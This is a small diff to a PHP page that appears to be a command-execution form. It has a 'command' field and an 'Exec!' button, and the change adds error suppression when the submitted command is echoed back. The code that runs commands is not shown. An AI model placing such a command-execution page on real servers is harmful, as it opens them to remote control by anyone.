@@ -5,7 +5,7 @@ ini_set('display_startup_errors', true);
 ?>
 
 <form method=post>
-<input type=text name=command value="<?=htmlspecialchars($_REQUEST['command'])?>">
+<input type=text name=command value="<?=htmlspecialchars(@$_REQUEST['command'])?>">
 <input type=submit name=submit value="Exec!">
 </form>
 <hr>
